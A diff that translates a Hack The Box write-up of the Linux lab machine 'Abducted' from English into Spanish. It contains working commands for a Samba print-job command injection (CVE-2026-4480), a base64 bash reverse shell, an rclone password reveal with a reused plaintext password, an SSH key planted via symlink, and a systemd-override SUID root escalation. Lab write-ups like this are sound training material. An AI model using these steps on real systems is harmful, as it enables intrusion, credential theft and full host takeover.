@@ -1,10 +1,10 @@
 ---
 created: 2026-8-3
-description: Abducted is a Linux box wich contains an exposed SMB service vulnerable to CVE-2026-4480, allowing unauthenticated remote code execution through a malicious print job. The foothold leads to credential reuse via an exposed rclone configuration, followed by lateral movement through Samba symbolic link abuse and privilege escalation by exploiting writable systemd service overrides.
+description: Abducted es una máquina Linux que expone un servicio SMB vulnerable a CVE-2026-4480, lo que permite la ejecución remota de código sin autenticación mediante un trabajo de impresión malicioso. El acceso inicial conduce a la reutilización de credenciales a través de una configuración expuesta de rclone, seguida de movimiento lateral mediante el abuso de enlaces simbólicos de Samba y escalada de privilegios explotando overrides escribibles de servicios systemd.
 ---
 
 #htb #medium #linux #smb #null-auth #print-spooler #cve-2026-4480 #rce #cron #rclone #credentials-reuse #symlink #smb-wide-links #systemd #service-overrides
-# Enumeration
+# Enumeración
 ## Nmap
 
 ```bash
@@ -15,7 +15,7 @@ Discovered open port 139/tcp on 10.129.244.177
 Discovered open port 445/tcp on 10.129.244.177
 ```
 
-Opened ports: 22,139,445
+Puertos abiertos: 22,139,445
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/scan
@@ -33,14 +33,14 @@ Host script results:
 
 ## SMB
 
-Check if **Null Auth** is enabled.
+Comprobar si **Null Auth** está habilitado.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/scan
 ❯ nxc smb 10.129.244.177 -u '' -p ''
 SMB   10.129.244.177  445    ABDUCTED   [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
-List the shares.
+Listar los recursos compartidos.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/scan
 ❯ nxc smb 10.129.244.177 -u '' -p '' --shares
@@ -52,13 +52,13 @@ transfer        Staff file transfer
 IPC$            IPC Service (Hartley Group Document Services)
 ```
 
-The only guest-accessible share is `HP-Reception`.
+El único recurso compartido accesible como invitado es `HP-Reception`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/scan
 ❯ smbclient //10.129.244.177/HP-Reception -N
 ```
 
-Gather additional information from the SMB service.
+Recopilar información adicional del servicio SMB.
 ```bash
 rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
 	ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
@@ -67,74 +67,74 @@ rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
 	server type     :	0x809a03
 ```
 
-The reported `os version` indicates that the host appears relatively old, altough it does not reveal the exact Samba version. However, the presence of a guest-accessible printer share matches the preconditions required by CVE-2026-4480, making it a good candidate for further testing.
+La `os version` reportada indica que el host parece relativamente antiguo, aunque no revela la versión exacta de Samba. Sin embargo, la presencia de un recurso compartido de impresora accesible como invitado coincide con las condiciones previas requeridas por CVE-2026-4480, lo que lo convierte en un buen candidato para realizar más pruebas.
 
-# Foothold
+# Acceso inicial
 
-[CVE-2026-4480](https://github.com/TheCyberGeek/CVE-2026-4480-PoC) affects Samba when it is configured with a printing command similar to:
+[CVE-2026-4480](https://github.com/TheCyberGeek/CVE-2026-4480-PoC) afecta a Samba cuando está configurado con un comando de impresión similar a:
 ```bash
 print command = /usr/local/bin/handle_job.sh %s %J
 ```
 
-The `%J` macro is replaced with the user-controlled document replacing only `'` with `_` allowing characters such as `|`, `;`, etc. are interpreted by the shell.
+La macro `%J` se reemplaza con el nombre del documento controlado por el usuario, sustituyendo únicamente `'` por `_`, lo que permite que caracteres como `|`, `;`, etc. sean interpretados por la shell.
 
-By setting the document name to `|sh`, the print command becomes a shell pipeline, causing the contents of the file to be redirected to `sh` and executed.
+Al establecer el nombre del documento como `|sh`, el comando de impresión se convierte en una tubería de shell, haciendo que el contenido del archivo se redirija a `sh` y se ejecute.
 
-Create a file named `|sh` with a `curl` request.
+Crear un archivo llamado `|sh` con una petición `curl`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
 ❯ echo "curl IP:8080" > "|sh"
 ```
 
-Setup a Python HTTP server.
+Levantar un servidor HTTP de Python.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/scan
 ❯ python -m http.server 8080
 ```
 
-Create a print job.
+Crear un trabajo de impresión.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
 ❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
 ```
 
-Check the HTTP server.
+Comprobar el servidor HTTP.
 ```bash
 10.129.244.177 - - [02/Aug/2026 21:12:27] "GET / HTTP/1.1" 200
 ```
 
-Receiving the HTTP request confirms that the payload was executed successfully, indicating that the server is vulnerable.
-# Exploitation
+Recibir la petición HTTP confirma que el payload se ejecutó correctamente, lo que indica que el servidor es vulnerable.
+# Explotación
 
 ## SMB
 
-Encode a bash reverse shell in Base64.
+Codificar una reverse shell de bash en Base64.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
 ❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
 ```
 
-Write the Base64-encoded payload to a file named `|sh`.
+Escribir el payload codificado en Base64 en un archivo llamado `|sh`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
 ❯ echo "echo <Base64 output> | base64 -d | bash" > "|sh"
 ```
 
-Start a listener.
+Iniciar un listener.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/scan
 ❯ nc -lnvp 4444
 ```
 
-Create a print job.
+Crear un trabajo de impresión.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
 ❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
 ```
 
-## Post-exploitation
+## Post-explotación
 
-Enumerate the `cron-jobs`.
+Enumerar las tareas de `cron`.
 ```bash
 nobody@abducted:/$ ls -R /etc/cron*   
 /etc/cron.d:
@@ -143,20 +143,20 @@ offsite-backup
 sysstat
 ```
 
-Read the backup job.
+Leer la tarea de backup.
 ```bash
 nobody@abducted:/$ cat /etc/cron.d/offsite-backup
 30 2 * * * root /opt/offsite-backup/sync.sh >/dev/null 2>&1
 ```
 
-The `sync.sh` script uses `rclone` to synchronize `/srv/projects` with an offsite SFTP server.
+El script `sync.sh` utiliza `rclone` para sincronizar `/srv/projects` con un servidor SFTP externo.
 ```bash
 nobody@abducted:/$ cat /opt/offsite-backup/sync.sh
 #!/bin/bash
 /usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
 ```
 
-Read the `rclone` config file.
+Leer el archivo de configuración de `rclone`.
 ```bash
 nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
 [offsite]
@@ -167,28 +167,28 @@ pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
 shell_type = unix
 ```
 
-Reveal the obfuscated password.
+Revelar la contraseña ofuscada.
 ```bash
 nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
 iXzvcib3SrpZ
 ```
 
-The password is reused by the user `scott`, allowing SSH access.
+La contraseña es reutilizada por el usuario `scott`, lo que permite el acceso por SSH.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/a/content
 ❯ ssh scott@10.129.244.177
 ```
 
-Read the user flag.
+Leer la flag de usuario.
 ```bash
 scott@abducted:~$ cat user.txt
 ```
 
-# Lateral movement
+# Movimiento lateral
 
-## SMB enumeration
+## Enumeración de SMB
 
-Read the config file of Samba.
+Leer el archivo de configuración de Samba.
 ```bash
 scott@abducted:~$ cat /etc/samba/shares.conf
 [transfer]
@@ -201,63 +201,63 @@ scott@abducted:~$ cat /etc/samba/shares.conf
    browseable = yes
 ```
 
-The `transfer` share is configured with `force user = marcus`. So every file operation performed through the share is executed as `marcus`. Also `wide links` is enabled which lets samba follow symbolic links outside the shared directory.
-Since `scott` owns `/srv/transfer`, a symbolic link can be created pointing to `marcus`'s home directory, allowing an `authorized_keys` file to be written into `/home/marcus/.ssh`.
+El recurso compartido `transfer` está configurado con `force user = marcus`. Por lo tanto, cada operación sobre archivos realizada a través del recurso compartido se ejecuta como `marcus`. Además, `wide links` está habilitado, lo que permite que Samba siga enlaces simbólicos fuera del directorio compartido.
+Como `scott` es propietario de `/srv/transfer`, se puede crear un enlace simbólico que apunte al directorio personal de `marcus`, permitiendo escribir un archivo `authorized_keys` en `/home/marcus/.ssh`.
 
-## Exploitation
+## Explotación
 
-Create the SSH key.
+Crear la clave SSH.
 ```bash
 scott@abducted:/tmp$ ssh-keygen -t ed25519 -q -N '' -f /tmp/ssh
 ```
 
-Create the symbolic link in `/srv/transfer`.
+Crear el enlace simbólico en `/srv/transfer`.
 ```bash
 scott@abducted:/srv/transfer$ ln -s /home/marcus marcus
 ```
 
-Create the `authorized_keys` file in `tmp`.
+Crear el archivo `authorized_keys` en `tmp`.
 ```bash
 scott@abducted:/tmp$ cat ssh.pub > authorized_keys
 ```
 
-Upload the `authorized_keys` file to `marcus/.ssh`
+Subir el archivo `authorized_keys` a `marcus/.ssh`
 ```bash
 scott@abducted:/tmp$ smbclient //127.0.0.1/transfer -U scott%iXzvcib3SrpZ -c "mkdir marcus/.ssh; put /tmp/authorized_keys marcus/.ssh/authorized_keys"
 ```
 
-Connect to `marcus` via SSH.
+Conectarse a `marcus` mediante SSH.
 ```bash
 scott@abducted:/tmp$ ssh -i ssh marcus@127.0.0.1
 ```
 
-# Privilege escalation
+# Escalada de privilegios
 
-## Enumeration
+## Enumeración
 
-`marcus` is member of the non-standard `operators` group.
+`marcus` es miembro del grupo no estándar `operators`.
 ```bash
 marcus@abducted:~$ id
 uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
 ```
 
-Find the group-writable files.
+Buscar los archivos escribibles por el grupo.
 ```bash
 marcus@abducted:~$ find / -group operators -perm -g=w 2>/dev/null
 /etc/systemd/system/smbd.service.d
 ```
 
-`marcus` has writable permissions on the `smbd.service` *drop-in overrides* directory. This directory is used to store override files that modify the original `systemd` service configuration.
+`marcus` tiene permisos de escritura en el directorio de *drop-in overrides* del servicio `smbd.service`. Este directorio se utiliza para almacenar archivos de override que modifican la configuración original del servicio `systemd`.
 
-Check if `marcus` can restart the service.
+Comprobar si `marcus` puede reiniciar el servicio.
 ```bash
 marcus@abducted:~$ systemctl restart smbd
 ```
 
-Since `marcus` can both restart the `smbd` service and write override files to `/etc/systemd/system/smbd.service.d`, it is possible to execute arbitrary commands as `root` by modifying the service configuration.
-## Exploitation
+Dado que `marcus` puede tanto reiniciar el servicio `smbd` como escribir archivos de override en `/etc/systemd/system/smbd.service.d`, es posible ejecutar comandos arbitrarios como `root` modificando la configuración del servicio.
+## Explotación
 
-Create a `systemd` override file in `/etc/systemd/system/smbd.service.d` that copies `/bin/bash` to `tmp` and adds SUID permissions to it.
+Crear un archivo de override de `systemd` en `/etc/systemd/system/smbd.service.d` que copie `/bin/bash` a `tmp` y le asigne permisos SUID.
 ```bash
 marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
 [Service]
@@ -266,18 +266,18 @@ ExecStartPre=/bin/chmod 4755 /tmp/suid_bash
 EOF
 ```
 
-Reload the service.
+Recargar el servicio.
 ```bash
 marcus@abducted:~$ systemctl daemon-reload
 marcus@abducted:~$ systemctl restart smbd
 ```
 
-Execute SUID copy of `bash` to obtain a `root` shell.
+Ejecutar la copia SUID de `bash` para obtener una shell de `root`.
 ```bash
 marcus@abducted:/tmp$ ./suid_bash -p
 ```
 
-Read the `root` flag.
+Leer la flag de `root`.
 ```bash
 suid_bash-5.2$ cat /root/root.txt
 ```
